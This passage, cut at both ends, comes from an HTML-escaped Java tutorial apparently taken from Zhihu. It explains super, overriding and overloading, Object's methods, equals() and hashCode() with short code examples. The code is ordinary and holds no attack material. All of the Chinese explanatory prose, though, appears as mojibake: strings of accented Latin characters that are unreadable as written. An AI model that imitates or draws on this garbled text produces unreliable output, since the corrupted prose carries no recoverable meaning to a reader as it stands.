href=\"https://link.zhihu.com/?target=https%3A//dzone.com/articles/when-to-use-abstract-class-and-intreface\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">When to Use Abstract Class and Interface</a></li></ul><h2>super</h2><ul><li>è®¿é—®çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼šå¯ä»¥ä½¿ç”¨ super() å‡½æ•°è®¿é—®çˆ¶ç±»çš„æ„é€ å‡½æ•°ï¼Œä»è€Œå§”æ‰˜çˆ¶ç±»å®Œæˆä¸€äº›åˆå§‹åŒ–çš„å·¥ä½œã€‚</li><li>è®¿é—®çˆ¶ç±»çš„æˆå‘˜ï¼šå¦‚æœå­ç±»é‡å†™äº†çˆ¶ç±»çš„æŸä¸ªæ–¹æ³•ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ super å…³é”®å­—æ¥å¼•ç”¨çˆ¶ç±»çš„æ–¹æ³•å®ç°ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SuperExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">protected</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"kd\">protected</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">SuperExample</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">x</span> <span class=\"o\">=</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">y</span> <span class=\"o\">=</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;SuperExample.func()&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">SuperExtendExample</span> <span class=\"kd\">extends</span> <span class=\"n\">SuperExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">z</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">SuperExtendExample</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">z</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"kd\">super</span><span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">,</span> <span class=\"n\">y</span><span class=\"o\">);</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">z</span> <span class=\"o\">=</span> <span class=\"n\">z</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">func</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"kd\">super</span><span class=\"o\">.</span><span class=\"na\">func</span><span class=\"o\">();</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;SuperExtendExample.func()&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">SuperExample</span> <span class=\"n\">e</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">SuperExtendExample</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">2</span><span class=\"o\">,</span> <span class=\"n\">3</span><span class=\"o\">);</span>\n<span class=\"n\">e</span><span class=\"o\">.</span><span class=\"na\">func</span><span class=\"o\">();</span>\n<span class=\"n\">SuperExample</span><span class=\"o\">.</span><span class=\"na\">func</span><span class=\"o\">()</span>\n<span class=\"n\">SuperExtendExample</span><span class=\"o\">.</span><span class=\"na\">func</span><span class=\"o\">()</span></code></pre></div><p><a href=\"https://link.zhihu.com/?target=https%3A//docs.oracle.com/javase/tutorial/java/IandI/super.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Using the Keyword super</a></p><h2>é‡å†™ä¸é‡è½½</h2><p><b>1. é‡å†™ï¼ˆOverrideï¼‰</b> </p><p>å­˜åœ¨äºç»§æ‰¿ä½“ç³»ä¸­ï¼ŒæŒ‡å­ç±»å®ç°äº†ä¸€ä¸ªä¸çˆ¶ç±»åœ¨æ–¹æ³•å£°æ˜ä¸Šå®Œå…¨ç›¸åŒçš„ä¸€ä¸ªæ–¹æ³•ã€‚</p><p>ä¸ºäº†æ»¡è¶³é‡Œå¼æ›¿æ¢åŸåˆ™ï¼Œé‡å†™æœ‰æœ‰ä»¥ä¸‹ä¸¤ä¸ªé™åˆ¶ï¼š</p><ul><li>å­ç±»æ–¹æ³•çš„è®¿é—®æƒé™å¿…é¡»å¤§äºç­‰äºçˆ¶ç±»æ–¹æ³•ï¼›</li><li>å­ç±»æ–¹æ³•çš„è¿”å›ç±»å‹å¿…é¡»æ˜¯çˆ¶ç±»æ–¹æ³•è¿”å›ç±»å‹æˆ–ä¸ºå…¶å­ç±»å‹ã€‚</li></ul><p>ä½¿ç”¨ @Override æ³¨è§£ï¼Œå¯ä»¥è®©ç¼–è¯‘å™¨å¸®å¿™æ£€æŸ¥æ˜¯å¦æ»¡è¶³ä¸Šé¢çš„ä¸¤ä¸ªé™åˆ¶æ¡ä»¶ã€‚</p><p><b>2. é‡è½½ï¼ˆOverloadï¼‰</b> </p><p>å­˜åœ¨äºåŒä¸€ä¸ªç±»ä¸­ï¼ŒæŒ‡ä¸€ä¸ªæ–¹æ³•ä¸å·²ç»å­˜åœ¨çš„æ–¹æ³•åç§°ä¸Šç›¸åŒï¼Œä½†æ˜¯å‚æ•°ç±»å‹ã€ä¸ªæ•°ã€é¡ºåºè‡³å°‘æœ‰ä¸€ä¸ªä¸åŒã€‚</p><p>åº”è¯¥æ³¨æ„çš„æ˜¯ï¼Œè¿”å›å€¼ä¸åŒï¼Œå…¶å®ƒéƒ½ç›¸åŒä¸ç®—æ˜¯é‡è½½ã€‚</p><p><b>3. å®ä¾‹</b> </p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">class</span> <span class=\"nc\">A</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">show</span><span class=\"o\">(</span><span class=\"n\">D</span> <span class=\"n\">obj</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"s\">&#34;A and D&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">show</span><span class=\"o\">(</span><span class=\"n\">A</span> <span class=\"n\">obj</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"s\">&#34;A and A&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">class</span> <span class=\"nc\">B</span> <span class=\"kd\">extends</span> <span class=\"n\">A</span> <span class=\"o\">{</span>\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">show</span><span class=\"o\">(</span><span class=\"n\">B</span> <span class=\"n\">obj</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"s\">&#34;B and B&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">show</span><span class=\"o\">(</span><span class=\"n\">A</span> <span class=\"n\">obj</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"o\">(</span><span class=\"s\">&#34;B and A&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">class</span> <span class=\"nc\">C</span> <span class=\"kd\">extends</span> <span class=\"n\">B</span> <span class=\"o\">{</span>\n<span class=\"o\">}</span>\n\n<span class=\"kd\">class</span> <span class=\"nc\">D</span> <span class=\"kd\">extends</span> <span class=\"n\">B</span> <span class=\"o\">{</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Test</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">A</span> <span class=\"n\">a1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">A</span><span class=\"o\">();</span>\n        <span class=\"n\">A</span> <span class=\"n\">a2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">B</span><span class=\"o\">();</span>\n        <span class=\"n\">B</span> <span class=\"n\">b</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">B</span><span class=\"o\">();</span>\n        <span class=\"n\">C</span> <span class=\"n\">c</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">C</span><span class=\"o\">();</span>\n        <span class=\"n\">D</span> <span class=\"n\">d</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">D</span><span class=\"o\">();</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">a1</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">b</span><span class=\"o\">));</span> <span class=\"c1\">// A and A\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">a1</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">));</span> <span class=\"c1\">// A and A\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">a1</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">d</span><span class=\"o\">));</span> <span class=\"c1\">// A and D\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">a2</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">b</span><span class=\"o\">));</span> <span class=\"c1\">// B and A\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">a2</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">));</span> <span class=\"c1\">// B and A\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">a2</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">d</span><span class=\"o\">));</span> <span class=\"c1\">// A and D\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">b</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">b</span><span class=\"o\">));</span>  <span class=\"c1\">// B and B\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">b</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">c</span><span class=\"o\">));</span>  <span class=\"c1\">// B and B\n</span><span class=\"c1\"></span>        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">b</span><span class=\"o\">.</span><span class=\"na\">show</span><span class=\"o\">(</span><span class=\"n\">d</span><span class=\"o\">));</span>  <span class=\"c1\">// A and D\n</span><span class=\"c1\"></span>    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><p>æ¶‰åŠåˆ°é‡å†™æ—¶ï¼Œæ–¹æ³•è°ƒç”¨çš„ä¼˜å…ˆçº§ä¸ºï¼š</p><ul><li>this.show(O)</li><li>super.show(O)</li><li>this.show((super)O)</li><li>super.show((super)O)</li></ul><h2>äº”ã€Object é€šç”¨æ–¹æ³•</h2><h2>æ¦‚è§ˆ</h2><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">native</span> <span class=\"kt\">int</span> <span class=\"nf\">hashCode</span><span class=\"o\">()</span>\n\n<span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">equals</span><span class=\"o\">(</span><span class=\"n\">Object</span> <span class=\"n\">obj</span><span class=\"o\">)</span>\n\n<span class=\"kd\">protected</span> <span class=\"kd\">native</span> <span class=\"n\">Object</span> <span class=\"nf\">clone</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">CloneNotSupportedException</span>\n\n<span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">toString</span><span class=\"o\">()</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">native</span> <span class=\"n\">Class</span><span class=\"o\">&lt;?&gt;</span> <span class=\"n\">getClass</span><span class=\"o\">()</span>\n\n<span class=\"kd\">protected</span> <span class=\"kt\">void</span> <span class=\"nf\">finalize</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">Throwable</span> <span class=\"o\">{}</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">native</span> <span class=\"kt\">void</span> <span class=\"nf\">notify</span><span class=\"o\">()</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">native</span> <span class=\"kt\">void</span> <span class=\"nf\">notifyAll</span><span class=\"o\">()</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kd\">native</span> <span class=\"kt\">void</span> <span class=\"nf\">wait</span><span class=\"o\">(</span><span class=\"kt\">long</span> <span class=\"n\">timeout</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kt\">void</span> <span class=\"nf\">wait</span><span class=\"o\">(</span><span class=\"kt\">long</span> <span class=\"n\">timeout</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">nanos</span><span class=\"o\">)</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span>\n\n<span class=\"kd\">public</span> <span class=\"kd\">final</span> <span class=\"kt\">void</span> <span class=\"nf\">wait</span><span class=\"o\">()</span> <span class=\"kd\">throws</span> <span class=\"n\">InterruptedException</span></code></pre></div><h2>equals()</h2><p><b>1. ç­‰ä»·å…³ç³»</b> </p><p>â…  è‡ªåæ€§</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>â…¡ å¯¹ç§°æ€§</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">y</span><span class=\"o\">)</span> <span class=\"o\">==</span> <span class=\"n\">y</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>â…¢ ä¼ é€’æ€§</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">y</span><span class=\"o\">)</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">y</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">z</span><span class=\"o\">))</span>\n    <span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">z</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">true</span><span class=\"o\">;</span></code></pre></div><p>â…£ ä¸€è‡´æ€§</p><p>å¤šæ¬¡è°ƒç”¨ equals() æ–¹æ³•ç»“æœä¸å˜</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">y</span><span class=\"o\">)</span> <span class=\"o\">==</span> <span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">y</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">true</span></code></pre></div><p>â…¤ ä¸ null çš„æ¯”è¾ƒ</p><p>å¯¹ä»»ä½•ä¸æ˜¯ null çš„å¯¹è±¡ x è°ƒç”¨ x.equals(null) ç»“æœéƒ½ä¸º false</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"kc\">null</span><span class=\"o\">);</span> <span class=\"o\">//</span> <span class=\"kc\">false</span><span class=\"o\">;</span></code></pre></div><p><b>2. ç­‰ä»·ä¸ç›¸ç­‰</b> </p><ul><li>å¯¹äºåŸºæœ¬ç±»å‹ï¼Œ== åˆ¤æ–­ä¸¤ä¸ªå€¼æ˜¯å¦ç›¸ç­‰ï¼ŒåŸºæœ¬ç±»å‹æ²¡æœ‰ equals() æ–¹æ³•ã€‚</li><li>å¯¹äºå¼•ç”¨ç±»å‹ï¼Œ== åˆ¤æ–­ä¸¤ä¸ªå˜é‡æ˜¯å¦å¼•ç”¨åŒä¸€ä¸ªå¯¹è±¡ï¼Œè€Œ equals() åˆ¤æ–­å¼•ç”¨çš„å¯¹è±¡æ˜¯å¦ç­‰ä»·ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Integer</span> <span class=\"n\">x</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"n\">Integer</span> <span class=\"n\">y</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Integer</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">x</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">y</span><span class=\"o\">));</span> <span class=\"c1\">// true\n</span><span class=\"c1\"></span><span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">x</span> <span class=\"o\">==</span> <span class=\"n\">y</span><span class=\"o\">);</span>      <span class=\"o\">//</span> <span class=\"kc\">false</span></code></pre></div><p><b>3. å®ç°</b> </p><ul><li>æ£€æŸ¥æ˜¯å¦ä¸ºåŒä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼Œå¦‚æœæ˜¯ç›´æ¥è¿”å› trueï¼›</li><li>æ£€æŸ¥æ˜¯å¦æ˜¯åŒä¸€ä¸ªç±»å‹ï¼Œå¦‚æœä¸æ˜¯ï¼Œç›´æ¥è¿”å› falseï¼›</li><li>å°† Object å¯¹è±¡è¿›è¡Œè½¬å‹ï¼›</li><li>åˆ¤æ–­æ¯ä¸ªå…³é”®åŸŸæ˜¯å¦ç›¸ç­‰ã€‚</li></ul><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">EqualExample</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">z</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"nf\">EqualExample</span><span class=\"o\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"o\">,</span> <span class=\"kt\">int</span> <span class=\"n\">z</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">x</span> <span class=\"o\">=</span> <span class=\"n\">x</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">y</span> <span class=\"o\">=</span> <span class=\"n\">y</span><span class=\"o\">;</span>\n        <span class=\"k\">this</span><span class=\"o\">.</span><span class=\"na\">z</span> <span class=\"o\">=</span> <span class=\"n\">z</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"nd\">@Override</span>\n    <span class=\"kd\">public</span> <span class=\"kt\">boolean</span> <span class=\"nf\">equals</span><span class=\"o\">(</span><span class=\"n\">Object</span> <span class=\"n\">o</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"k\">this</span> <span class=\"o\">==</span> <span class=\"n\">o</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">true</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">o</span> <span class=\"o\">==</span> <span class=\"kc\">null</span> <span class=\"o\">||</span> <span class=\"n\">getClass</span><span class=\"o\">()</span> <span class=\"o\">!=</span> <span class=\"n\">o</span><span class=\"o\">.</span><span class=\"na\">getClass</span><span class=\"o\">())</span> <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n\n        <span class=\"n\">EqualExample</span> <span class=\"n\">that</span> <span class=\"o\">=</span> <span class=\"o\">(</span><span class=\"n\">EqualExample</span><span class=\"o\">)</span> <span class=\"n\">o</span><span class=\"o\">;</span>\n\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">x</span> <span class=\"o\">!=</span> <span class=\"n\">that</span><span class=\"o\">.</span><span class=\"na\">x</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">y</span> <span class=\"o\">!=</span> <span class=\"n\">that</span><span class=\"o\">.</span><span class=\"na\">y</span><span class=\"o\">)</span> <span class=\"k\">return</span> <span class=\"kc\">false</span><span class=\"o\">;</span>\n        <span class=\"k\">return</span> <span class=\"n\">z</span> <span class=\"o\">==</span> <span class=\"n\">that</span><span class=\"o\">.</span><span class=\"na\">z</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>hashCode()</h2><p>hashCode() è¿”å›æ•£åˆ—å€¼ï¼Œè€Œ equals() æ˜¯ç”¨æ¥åˆ¤æ–­ä¸¤ä¸ªå¯¹è±¡æ˜¯å¦ç­‰ä»·ã€‚ç­‰ä»·çš„ä¸¤ä¸ªå¯¹è±¡æ•£åˆ—å€¼ä¸€å®šç›¸åŒï¼Œä½†æ˜¯æ•£åˆ—å€¼ç›¸åŒçš„ä¸¤ä¸ªå¯¹è±¡ä¸ä¸€å®šç­‰ä»·ã€‚</p><p>åœ¨è¦†ç›– equals() æ–¹æ³•æ—¶åº”å½“æ€»æ˜¯è¦†ç›– hashCode() æ–¹æ³•ï¼Œä¿è¯ç­‰ä»·çš„ä¸¤ä¸ªå¯¹è±¡æ•£åˆ—å€¼ä¹Ÿç›¸ç­‰ã€‚</p><p>ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæ–°å»ºäº†ä¸¤ä¸ªç­‰ä»·çš„å¯¹è±¡ï¼Œå¹¶å°†å®ƒä»¬æ·»åŠ åˆ° HashSet ä¸­ã€‚æˆ‘ä»¬å¸Œæœ›å°†è¿™ä¸¤ä¸ªå¯¹è±¡å½“æˆä¸€æ ·çš„ï¼Œåªåœ¨é›†åˆä¸­æ·»åŠ ä¸€ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯å› ä¸º EqualExample æ²¡æœ‰å®ç° hasCode() æ–¹æ³•ï¼Œå› æ­¤è¿™ä¸¤ä¸ªå¯¹è±¡çš„æ•£åˆ—å€¼æ˜¯ä¸åŒçš„ï¼Œæœ€ç»ˆå¯¼è‡´é›†åˆæ·»åŠ äº†ä¸¤ä¸ªç­‰ä»·çš„å¯¹è±¡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">EqualExample</span> <span class=\"n\">e1</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">EqualExample</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"n\">EqualExample</span> <span class=\"n\">e2</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">EqualExample</span><span class=\"o\">(</span><span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">,</span> <span class=\"n\">1</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">e1</span><span class=\"o\">.</span><span class=\"na\">equals</span><span class=\"o\">(</span><span class=\"n\">e2</span><span class=\"o\">));</span> <span class=\"c1\">// true\n</span><span class=\"c1\"></span><span class=\"n\">HashSet</span><span class=\"o\">&lt;</span><span class=\"n\">EqualExample</span><span class=\"o\">&gt;</span> <span class=\"n\">set</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">HashSet</span><span class=\"o\">&lt;&gt;();</span>\n<span class=\"n\">set</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">e1</span><span class=\"o\">);</span>\n<span class=\"n\">set</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"n\">e2</span><span class=\"o\">);</span>\n<span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">set</span><span class=\"o\">.</span><span class=\"na\">size</span><span class=\"o\">());</span>   <span class=\"o\">//</span> <span class=\"n\">2</span></code></pre></div><p>ç†æƒ³çš„æ•£åˆ—å‡½æ•°åº”å½“å…·æœ‰å‡åŒ€æ€§ï¼Œå³ä¸ç›¸ç­‰çš„å¯¹è±¡åº”å½“å‡åŒ€åˆ†å¸ƒåˆ°æ‰€æœ‰å¯èƒ½çš„æ•£åˆ—å€¼ä¸Šã€‚è¿™å°±è¦æ±‚äº†æ•£åˆ—å‡½æ•°è¦æŠŠæ‰€æœ‰åŸŸçš„å€¼éƒ½è€ƒè™‘è¿›æ¥ã€‚å¯ä»¥å°†æ¯ä¸ªåŸŸéƒ½å½“æˆ R è¿›åˆ¶çš„æŸä¸€ä½ï¼Œç„¶åç»„æˆä¸€ä¸ª R è¿›åˆ¶çš„æ•´æ•°ã€‚R ä¸€èˆ¬å– 31ï¼Œå› ä¸ºå®ƒæ˜¯ä¸€ä¸ªå¥‡ç´ æ•°ï¼Œå¦‚æœæ˜¯å¶æ•°çš„è¯ï¼Œå½“å‡ºç°ä¹˜æ³•æº¢å‡ºï¼Œä¿¡æ¯å°±ä¼šä¸¢å¤±ï¼Œå› ä¸ºä¸ 2 ç›¸ä¹˜ç›¸å½“äºå‘å·¦ç§»ä¸€ä½ã€‚</p><p>ä¸€ä¸ªæ•°ä¸ 31 ç›¸ä¹˜å¯ä»¥è½¬æ¢æˆç§»ä½å’Œå‡æ³•ï¼š<code>31*x == 